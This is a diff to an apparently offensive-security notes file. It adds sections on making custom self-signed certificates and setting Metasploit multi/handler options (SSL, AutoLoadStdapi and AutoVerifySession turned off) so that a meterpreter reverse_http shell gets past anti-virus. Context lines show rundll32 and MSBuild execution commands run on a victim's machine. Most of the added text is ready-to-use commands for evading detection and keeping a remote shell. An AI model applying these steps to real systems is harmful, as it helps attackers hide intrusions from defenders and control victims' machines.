@@ -61,7 +61,7 @@ C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.writ
 Access is denied.
 ```
 
-# Living Off of the Land with MSBuild:
+# Living Off the Land with MSBuild:
 
 MSBuild.exe is a built-in Windows tool for building and executing C/C++/C# code.
 
@@ -142,3 +142,53 @@ On the victim's machine:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe WindowsHelper.csproj
 ```
+
+# Generating Self-Signed Certificates:
+
+Msfvenom randomizes SSL certificates. Such certificates could be detected by signature scanning. You can bypass it by creating your custom SSL certificate.
+
+```
+openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
+```
+
+Create a .pem file:
+
+```
+cat priv.key cert.crt > custom.pem
+```
+
+Change CipherString=DEFAULT@SECLEVEL=2 in /etc/ssl/openssl.cnf to:
+
+```
+CipherString = DEFAULT
+```
+
+# Metasploit Listener:
+
+There are some advanced options in the Metasploit multi/handler module that can help you bypass anti-virus. The first of them is the SSL option. When set to true you listener will be using SSL for the connection. You can use created above custom self-signed certificate for this purpose.
+
+```
+set payload windows/x64/meterpreter/reverse_http
+set SSL true
+set HandlerSSLCert /home/RoseSecurity/custom.pem
+```
+
+Another very handy option is to turn off autoloading of stdapi which is responsible to load the default commands of the meterpreter. When loaded, it reserves a space in memory to load meterpreter functions. Anti-viruses scan all the process memory for this signature and can detect that as malicious. If you set it to false, the meterpreter will behave like a common connection. After getting the reverse shell, you can load stdapi manually.
+
+```
+set AutoLoadStdapi false
+```
+
+AutoVerifySession option makes the meterpreter send another connection after establishing the first connection to see if it is alive. It can be detected too.
+
+```
+set AutoVerifySession false
+```
+
+When you connect to the target, make sure that you load the stdapi to achieve full shell functionality:
+
+```
+meterpreter> load stdapi
+```
+
+@Karmaz95
